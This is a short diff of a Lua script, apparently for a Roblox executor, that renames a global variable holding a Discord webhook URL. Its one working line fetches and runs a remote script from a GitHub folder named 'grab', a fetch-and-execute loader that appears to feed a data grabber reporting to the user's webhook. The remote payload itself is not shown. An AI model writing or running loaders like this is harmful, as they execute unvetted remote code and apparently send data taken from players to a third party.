@@ -1,5 +1,5 @@
--- to use this just put ur webhook into the value of _G.webhook and exec lol
+-- to use this just put ur webhook into the value of _G.WebhookUrl and exec lol
 
 
-_G.webhook = "https://discordapp.com/<webhook>"
+_G.WebhookUrl = "https://discordapp.com/<webhook>"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/carter-fr/RandomStuff/main/grab/funny.lua"))()
